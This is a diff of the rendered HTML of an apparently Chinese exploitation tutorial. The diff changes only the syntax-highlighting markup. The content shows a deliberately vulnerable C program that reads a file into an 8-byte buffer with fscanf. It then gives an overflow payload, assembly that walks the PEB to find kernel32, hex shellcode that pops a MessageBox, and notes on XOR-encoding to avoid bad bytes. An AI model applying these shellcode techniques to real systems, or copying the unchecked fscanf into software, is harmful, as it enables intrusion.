@@ -202,29 +202,29 @@
 </span><span class="lnt">22
 </span></code></pre></td>
 <td class="lntd">
-<pre tabindex="0" class="chroma"><code class="language-C++" data-lang="C++"><span class="cp">#include</span> <span class="cpf">&lt;stdio.h&gt;</span><span class="cp">
-</span><span class="cp">#include</span> <span class="cpf">&lt;windows.H&gt;</span><span class="cp">
-</span><span class="cp"></span><span class="kt">int</span> <span class="nf">main</span><span class="p">(</span><span class="kt">int</span> <span class="n">argc</span><span class="p">,</span> <span class="kt">char</span><span class="o">*</span> <span class="n">argv</span><span class="p">[])</span>
-<span class="p">{</span>
-	<span class="kt">char</span> <span class="n">szBuf</span><span class="p">[</span><span class="mi">8</span><span class="p">];</span>
-	<span class="n">FILE</span><span class="o">*</span> <span class="n">fp</span> <span class="o">=</span> <span class="nb">NULL</span><span class="p">;</span>
-
-	<span class="n">fp</span> <span class="o">=</span> <span class="n">fopen</span><span class="p">(</span><span class="s">&#34;pwd.txt&#34;</span><span class="p">,</span> <span class="s">&#34;r+&#34;</span><span class="p">);</span>
-	<span class="n">fscanf</span><span class="p">(</span><span class="n">fp</span><span class="p">,</span> <span class="s">&#34;%s&#34;</span><span class="p">,</span> <span class="n">szBuf</span><span class="p">);</span>
-
-	<span class="k">if</span> <span class="p">(</span><span class="n">strcmp</span><span class="p">(</span><span class="n">szBuf</span><span class="p">,</span> <span class="s">&#34;Hello&#34;</span><span class="p">)</span> <span class="o">==</span> <span class="mi">0</span><span class="p">)</span>
-	<span class="p">{</span>
-		<span class="n">printf</span><span class="p">(</span><span class="s">&#34;ok</span><span class="se">\r\n</span><span class="s">&#34;</span><span class="p">);</span>
-	<span class="p">}</span>
-	<span class="k">else</span>
-	<span class="p">{</span>
-		<span class="n">printf</span><span class="p">(</span><span class="s">&#34;error</span><span class="se">\r\n</span><span class="s">&#34;</span><span class="p">);</span>
-	<span class="p">}</span>
-
-	<span class="n">fclose</span><span class="p">(</span><span class="n">fp</span><span class="p">);</span>
-	<span class="k">return</span> <span class="mi">0</span><span class="p">;</span>
-<span class="p">}</span>
-</code></pre></td></tr></table>
+<pre tabindex="0" class="chroma"><code class="language-C++" data-lang="C++"><span class="line"><span class="cl"><span class="cp">#include</span> <span class="cpf">&lt;stdio.h&gt;</span><span class="cp">
+</span></span></span><span class="line"><span class="cl"><span class="cp">#include</span> <span class="cpf">&lt;windows.H&gt;</span><span class="cp">
+</span></span></span><span class="line"><span class="cl"><span class="cp"></span><span class="kt">int</span> <span class="nf">main</span><span class="p">(</span><span class="kt">int</span> <span class="n">argc</span><span class="p">,</span> <span class="kt">char</span><span class="o">*</span> <span class="n">argv</span><span class="p">[])</span>
+</span></span><span class="line"><span class="cl"><span class="p">{</span>
+</span></span><span class="line"><span class="cl">	<span class="kt">char</span> <span class="n">szBuf</span><span class="p">[</span><span class="mi">8</span><span class="p">];</span>
+</span></span><span class="line"><span class="cl">	<span class="n">FILE</span><span class="o">*</span> <span class="n">fp</span> <span class="o">=</span> <span class="nb">NULL</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">	<span class="n">fp</span> <span class="o">=</span> <span class="n">fopen</span><span class="p">(</span><span class="s">&#34;pwd.txt&#34;</span><span class="p">,</span> <span class="s">&#34;r+&#34;</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">	<span class="n">fscanf</span><span class="p">(</span><span class="n">fp</span><span class="p">,</span> <span class="s">&#34;%s&#34;</span><span class="p">,</span> <span class="n">szBuf</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">	<span class="k">if</span> <span class="p">(</span><span class="n">strcmp</span><span class="p">(</span><span class="n">szBuf</span><span class="p">,</span> <span class="s">&#34;Hello&#34;</span><span class="p">)</span> <span class="o">==</span> <span class="mi">0</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">	<span class="p">{</span>
+</span></span><span class="line"><span class="cl">		<span class="n">printf</span><span class="p">(</span><span class="s">&#34;ok</span><span class="se">\r\n</span><span class="s">&#34;</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">	<span class="p">}</span>
+</span></span><span class="line"><span class="cl">	<span class="k">else</span>
+</span></span><span class="line"><span class="cl">	<span class="p">{</span>
+</span></span><span class="line"><span class="cl">		<span class="n">printf</span><span class="p">(</span><span class="s">&#34;error</span><span class="se">\r\n</span><span class="s">&#34;</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">	<span class="p">}</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">	<span class="n">fclose</span><span class="p">(</span><span class="n">fp</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">	<span class="k">return</span> <span class="mi">0</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl"><span class="p">}</span>
+</span></span></code></pre></td></tr></table>
 </div>
 </div><h2 id="漏洞利用">漏洞利用</h2>
 <p>上述代码中fscanf没有长度检查,所以会造成栈溢出,可以被我们利用.</p>
@@ -263,8 +263,8 @@
 <pre tabindex="0" class="chroma"><code><span class="lnt">1
 </span></code></pre></td>
 <td class="lntd">
-<pre tabindex="0" class="chroma"><code class="language-asm" data-lang="asm"><span class="err">72</span> <span class="err">00</span> <span class="err">6</span><span class="nf">C</span> <span class="mi">6</span><span class="no">C</span> <span class="mi">6</span><span class="no">F</span> <span class="mi">00</span> <span class="mi">00</span> <span class="mi">00</span> <span class="mi">74</span> <span class="no">FF</span> <span class="mi">19</span> <span class="mi">00</span> <span class="mi">34</span> <span class="no">FF</span> <span class="mi">19</span> <span class="mi">00</span> <span class="mi">8</span><span class="no">B</span> <span class="no">DC</span> <span class="mi">81</span> <span class="no">EC</span> <span class="mi">00</span> <span class="mi">02</span> <span class="mi">00</span> <span class="mi">00</span> <span class="mi">8</span><span class="no">D</span> <span class="mi">43</span> <span class="no">F0</span> <span class="mi">50</span> <span class="mi">50</span> <span class="no">B8</span> <span class="no">A0</span> <span class="mi">7</span><span class="no">B</span> <span class="no">E2</span> <span class="mi">76</span> <span class="no">FF</span> <span class="no">D0</span> <span class="mi">8</span><span class="no">D</span> <span class="mi">5</span><span class="no">C</span> <span class="mi">24</span> <span class="mi">08</span> <span class="mi">53</span> <span class="mi">68</span> <span class="mi">1</span><span class="no">C</span> <span class="mi">21</span> <span class="mi">40</span> <span class="mi">00</span> <span class="mi">50</span> <span class="no">B8</span> <span class="mi">50</span> <span class="mi">10</span> <span class="mi">40</span> <span class="mi">00</span> <span class="no">FF</span> <span class="no">D0</span> <span class="no">FF</span> <span class="no">E3</span>
-</code></pre></td></tr></table>
+<pre tabindex="0" class="chroma"><code class="language-asm" data-lang="asm"><span class="line"><span class="cl"><span class="err">72</span> <span class="err">00</span> <span class="err">6</span><span class="nf">C</span> <span class="mi">6</span><span class="no">C</span> <span class="mi">6</span><span class="no">F</span> <span class="mi">00</span> <span class="mi">00</span> <span class="mi">00</span> <span class="mi">74</span> <span class="no">FF</span> <span class="mi">19</span> <span class="mi">00</span> <span class="mi">34</span> <span class="no">FF</span> <span class="mi">19</span> <span class="mi">00</span> <span class="mi">8</span><span class="no">B</span> <span class="no">DC</span> <span class="mi">81</span> <span class="no">EC</span> <span class="mi">00</span> <span class="mi">02</span> <span class="mi">00</span> <span class="mi">00</span> <span class="mi">8</span><span class="no">D</span> <span class="mi">43</span> <span class="no">F0</span> <span class="mi">50</span> <span class="mi">50</span> <span class="no">B8</span> <span class="no">A0</span> <span class="mi">7</span><span class="no">B</span> <span class="no">E2</span> <span class="mi">76</span> <span class="no">FF</span> <span class="no">D0</span> <span class="mi">8</span><span class="no">D</span> <span class="mi">5</span><span class="no">C</span> <span class="mi">24</span> <span class="mi">08</span> <span class="mi">53</span> <span class="mi">68</span> <span class="mi">1</span><span class="no">C</span> <span class="mi">21</span> <span class="mi">40</span> <span class="mi">00</span> <span class="mi">50</span> <span class="no">B8</span> <span class="mi">50</span> <span class="mi">10</span> <span class="mi">40</span> <span class="mi">00</span> <span class="no">FF</span> <span class="no">D0</span> <span class="no">FF</span> <span class="no">E3</span>
+</span></span></code></pre></td></tr></table>
 </div>
 </div><h4 id="我们在r文件中填写内容">我们在r文件中填写内容.</h4>
 <p>上面开辟的空间就是r文件的大小,0x200字节.</p>
@@ -284,18 +284,18 @@
 </span><span class="lnt">11
 </span></code></pre></td>
 <td class="lntd">
-<pre tabindex="0" class="chroma"><code class="language-asm" data-lang="asm"><span class="nf">GetKernelBase</span> <span class="no">proc</span>
- <span class="nf">assume</span> <span class="no">fs</span> <span class="p">:</span> <span class="no">nothing</span>
- <span class="nf">mov</span> <span class="no">eax</span><span class="p">,</span> <span class="no">fs</span><span class="p">:[</span><span class="mi">18</span><span class="no">h</span><span class="p">]</span>
- <span class="nf">mov</span> <span class="no">eax</span><span class="p">,</span> <span class="p">[</span><span class="no">eax</span> <span class="err">+</span> <span class="mi">30</span><span class="no">h</span><span class="p">]</span> <span class="c">;指向PEB结构
-</span><span class="c"></span> <span class="no">mov</span> <span class="no">eax</span><span class="p">,</span> <span class="p">[</span><span class="no">eax</span> <span class="err">+</span> <span class="mi">0</span><span class="no">ch</span><span class="p">]</span> <span class="c">;指向LDR Ptr32 _PEB_LDR_DATA
-</span><span class="c"></span> <span class="no">mov</span> <span class="no">eax</span><span class="p">,</span> <span class="p">[</span><span class="no">eax</span> <span class="err">+</span> <span class="mi">0</span><span class="no">ch</span><span class="p">]</span> <span class="c">;指向InLoadOrderModuleList _LIST_ENTRY
-</span><span class="c"></span> <span class="no">mov</span> <span class="no">eax</span><span class="p">,</span> <span class="p">[</span><span class="no">eax</span><span class="p">]</span>       <span class="c">;移动_LIST_ENTRY
-</span><span class="c"></span> <span class="no">mov</span> <span class="no">eax</span><span class="p">,</span> <span class="p">[</span><span class="no">eax</span><span class="p">]</span>       <span class="c">;指向Kernel32
-</span><span class="c"></span> <span class="no">mov</span> <span class="no">eax</span><span class="p">,</span> <span class="p">[</span><span class="no">eax</span> <span class="err">+</span> <span class="mi">18</span><span class="no">h</span><span class="p">]</span> <span class="c">;指向DllBase
-</span><span class="c"></span> <span class="no">ret</span>
-<span class="nf">GetKernelBase</span> <span class="no">endp</span>
-</code></pre></td></tr></table>
+<pre tabindex="0" class="chroma"><code class="language-asm" data-lang="asm"><span class="line"><span class="cl"><span class="nf">GetKernelBase</span> <span class="no">proc</span>
+</span></span><span class="line"><span class="cl"> <span class="nf">assume</span> <span class="no">fs</span> <span class="p">:</span> <span class="no">nothing</span>
+</span></span><span class="line"><span class="cl"> <span class="nf">mov</span> <span class="no">eax</span><span class="p">,</span> <span class="no">fs</span><span class="p">:[</span><span class="mi">18</span><span class="no">h</span><span class="p">]</span>
+</span></span><span class="line"><span class="cl"> <span class="nf">mov</span> <span class="no">eax</span><span class="p">,</span> <span class="p">[</span><span class="no">eax</span> <span class="err">+</span> <span class="mi">30</span><span class="no">h</span><span class="p">]</span> <span class="c">;指向PEB结构
+</span></span></span><span class="line"><span class="cl"><span class="c"></span> <span class="no">mov</span> <span class="no">eax</span><span class="p">,</span> <span class="p">[</span><span class="no">eax</span> <span class="err">+</span> <span class="mi">0</span><span class="no">ch</span><span class="p">]</span> <span class="c">;指向LDR Ptr32 _PEB_LDR_DATA
+</span></span></span><span class="line"><span class="cl"><span class="c"></span> <span class="no">mov</span> <span class="no">eax</span><span class="p">,</span> <span class="p">[</span><span class="no">eax</span> <span class="err">+</span> <span class="mi">0</span><span class="no">ch</span><span class="p">]</span> <span class="c">;指向InLoadOrderModuleList _LIST_ENTRY
+</span></span></span><span class="line"><span class="cl"><span class="c"></span> <span class="no">mov</span> <span class="no">eax</span><span class="p">,</span> <span class="p">[</span><span class="no">eax</span><span class="p">]</span>       <span class="c">;移动_LIST_ENTRY
+</span></span></span><span class="line"><span class="cl"><span class="c"></span> <span class="no">mov</span> <span class="no">eax</span><span class="p">,</span> <span class="p">[</span><span class="no">eax</span><span class="p">]</span>       <span class="c">;指向Kernel32
+</span></span></span><span class="line"><span class="cl"><span class="c"></span> <span class="no">mov</span> <span class="no">eax</span><span class="p">,</span> <span class="p">[</span><span class="no">eax</span> <span class="err">+</span> <span class="mi">18</span><span class="no">h</span><span class="p">]</span> <span class="c">;指向DllBase
+</span></span></span><span class="line"><span class="cl"><span class="c"></span> <span class="no">ret</span>
+</span></span><span class="line"><span class="cl"><span class="nf">GetKernelBase</span> <span class="no">endp</span>
+</span></span></code></pre></td></tr></table>
 </div>
 </div><ol>
 <li>在r文件中准备函数和字符串.</li>
@@ -313,8 +313,8 @@
 <pre tabindex="0" class="chroma"><code><span class="lnt">1
 </span></code></pre></td>
 <td class="lntd">
-<pre tabindex="0" class="chroma"><code class="language-asm" data-lang="asm"><span class="err">558</span><span class="nf">BEC5653578B750803763C8D76788B360375088B450C250000FFFF0BC075168B450C2B46103B4614766D33C05F5B5EC9C20800EB628B450C8B5E20035D0833C9EB388B3C8B037D085157568BF7B000B9FFFFFFFFF2AEF7D18BFE8B750CF3A68A46FF3A47FF750433C0EB051BC0D1E0405E5F590BC07502EB06413B4E1872C33B4E18720933C05F5B5EC9C208008B5E24035D080FB7044B8B5E1C035D088B04830BC0750933C05F5B5EC9C208000345085F5B5EC9C2080064A1180000008B40308B400C8B400C8B008B008B4018C3904C6F61644C69627261727941004D657373616765426F78410048656C6C6F576F726C6421007573657233322E646C6C00</span>
-</code></pre></td></tr></table>
+<pre tabindex="0" class="chroma"><code class="language-asm" data-lang="asm"><span class="line"><span class="cl"><span class="err">558</span><span class="nf">BEC5653578B750803763C8D76788B360375088B450C250000FFFF0BC075168B450C2B46103B4614766D33C05F5B5EC9C20800EB628B450C8B5E20035D0833C9EB388B3C8B037D085157568BF7B000B9FFFFFFFFF2AEF7D18BFE8B750CF3A68A46FF3A47FF750433C0EB051BC0D1E0405E5F590BC07502EB06413B4E1872C33B4E18720933C05F5B5EC9C208008B5E24035D080FB7044B8B5E1C035D088B04830BC0750933C05F5B5EC9C208000345085F5B5EC9C2080064A1180000008B40308B400C8B400C8B008B008B4018C3904C6F61644C69627261727941004D657373616765426F78410048656C6C6F576F726C6421007573657233322E646C6C00</span>
+</span></span></code></pre></td></tr></table>
 </div>
 </div><p>但是这里有个问题,fscanf遇到特定字符就会截断,如0d,0a,0c,0b,20这样的内容,我们需要做个工具,对这些内容进行加密,加密后不允许出现上述字符,如异或加密,我们需要找个一个异或值,使其我们的内容异或后没有敏感字符.</p>
 <ol start="2">
@@ -357,8 +357,8 @@
 <pre tabindex="0" class="chroma"><code><span class="lnt">1
 </span></code></pre></td>
 <td class="lntd">
-<pre tabindex="0" class="chroma"><code class="language-asm" data-lang="asm"><span class="err">8</span><span class="nf">D</span> <span class="no">B3</span> <span class="mi">00</span> <span class="mi">01</span> <span class="mi">00</span> <span class="mi">00</span> <span class="no">B9</span> <span class="mi">00</span> <span class="mi">01</span> <span class="mi">00</span> <span class="mi">00</span> <span class="mi">80</span> <span class="mi">74</span> <span class="mi">31</span> <span class="no">FF</span> <span class="mi">85</span> <span class="no">E2</span> <span class="no">F9</span> <span class="mi">8</span><span class="no">D</span> <span class="mi">83</span> <span class="no">B8</span> <span class="mi">01</span> <span class="mi">00</span> <span class="mi">00</span> <span class="no">FF</span> <span class="no">D0</span> <span class="mi">8</span><span class="no">D</span> <span class="mi">8</span><span class="no">B</span> <span class="no">D0</span> <span class="mi">01</span> <span class="mi">00</span> <span class="mi">00</span> <span class="mi">51</span> <span class="mi">50</span> <span class="mi">8</span><span class="no">D</span> <span class="mi">83</span> <span class="mi">00</span> <span class="mi">01</span> <span class="mi">00</span> <span class="mi">00</span> <span class="no">FF</span> <span class="no">D0</span> <span class="mi">8</span><span class="no">D</span> <span class="mi">8</span><span class="no">B</span> <span class="no">F5</span> <span class="mi">01</span> <span class="mi">00</span> <span class="mi">00</span> <span class="mi">51</span> <span class="no">FF</span> <span class="no">D0</span> <span class="mi">8</span><span class="no">D</span> <span class="mi">8</span><span class="no">B</span> <span class="no">DD</span> <span class="mi">01</span> <span class="mi">00</span> <span class="mi">00</span> <span class="mi">51</span> <span class="mi">50</span> <span class="mi">8</span><span class="no">D</span> <span class="mi">83</span> <span class="mi">00</span> <span class="mi">01</span> <span class="mi">00</span> <span class="mi">00</span> <span class="no">FF</span> <span class="no">D0</span> <span class="mi">6</span><span class="no">A</span> <span class="mi">00</span> <span class="mi">8</span><span class="no">D</span> <span class="mi">8</span><span class="no">B</span> <span class="no">F5</span> <span class="mi">01</span> <span class="mi">00</span> <span class="mi">00</span> <span class="mi">51</span> <span class="mi">8</span><span class="no">D</span> <span class="mi">8</span><span class="no">B</span> <span class="no">E9</span> <span class="mi">01</span> <span class="mi">00</span> <span class="mi">00</span> <span class="mi">51</span> <span class="mi">6</span><span class="no">A</span> <span class="mi">00</span> <span class="no">FF</span> <span class="no">D0</span> <span class="no">E8</span> <span class="no">A0</span> <span class="mi">88</span> <span class="no">A6</span> <span class="mi">76</span>
-</code></pre></td></tr></table>
+<pre tabindex="0" class="chroma"><code class="language-asm" data-lang="asm"><span class="line"><span class="cl"><span class="err">8</span><span class="nf">D</span> <span class="no">B3</span> <span class="mi">00</span> <span class="mi">01</span> <span class="mi">00</span> <span class="mi">00</span> <span class="no">B9</span> <span class="mi">00</span> <span class="mi">01</span> <span class="mi">00</span> <span class="mi">00</span> <span class="mi">80</span> <span class="mi">74</span> <span class="mi">31</span> <span class="no">FF</span> <span class="mi">85</span> <span class="no">E2</span> <span class="no">F9</span> <span class="mi">8</span><span class="no">D</span> <span class="mi">83</span> <span class="no">B8</span> <span class="mi">01</span> <span class="mi">00</span> <span class="mi">00</span> <span class="no">FF</span> <span class="no">D0</span> <span class="mi">8</span><span class="no">D</span> <span class="mi">8</span><span class="no">B</span> <span class="no">D0</span> <span class="mi">01</span> <span class="mi">00</span> <span class="mi">00</span> <span class="mi">51</span> <span class="mi">50</span> <span class="mi">8</span><span class="no">D</span> <span class="mi">83</span> <span class="mi">00</span> <span class="mi">01</span> <span class="mi">00</span> <span class="mi">00</span> <span class="no">FF</span> <span class="no">D0</span> <span class="mi">8</span><span class="no">D</span> <span class="mi">8</span><span class="no">B</span> <span class="no">F5</span> <span class="mi">01</span> <span class="mi">00</span> <span class="mi">00</span> <span class="mi">51</span> <span class="no">FF</span> <span class="no">D0</span> <span class="mi">8</span><span class="no">D</span> <span class="mi">8</span><span class="no">B</span> <span class="no">DD</span> <span class="mi">01</span> <span class="mi">00</span> <span class="mi">00</span> <span class="mi">51</span> <span class="mi">50</span> <span class="mi">8</span><span class="no">D</span> <span class="mi">83</span> <span class="mi">00</span> <span class="mi">01</span> <span class="mi">00</span> <span class="mi">00</span> <span class="no">FF</span> <span class="no">D0</span> <span class="mi">6</span><span class="no">A</span> <span class="mi">00</span> <span class="mi">8</span><span class="no">D</span> <span class="mi">8</span><span class="no">B</span> <span class="no">F5</span> <span class="mi">01</span> <span class="mi">00</span> <span class="mi">00</span> <span class="mi">51</span> <span class="mi">8</span><span class="no">D</span> <span class="mi">8</span><span class="no">B</span> <span class="no">E9</span> <span class="mi">01</span> <span class="mi">00</span> <span class="mi">00</span> <span class="mi">51</span> <span class="mi">6</span><span class="no">A</span> <span class="mi">00</span> <span class="no">FF</span> <span class="no">D0</span> <span class="no">E8</span> <span class="no">A0</span> <span class="mi">88</span> <span class="no">A6</span> <span class="mi">76</span>
+</span></span></code></pre></td></tr></table>
 </div>
 </div><p>将上述二进制数据存到r文件开始即可.</p>
 <ol start="4">
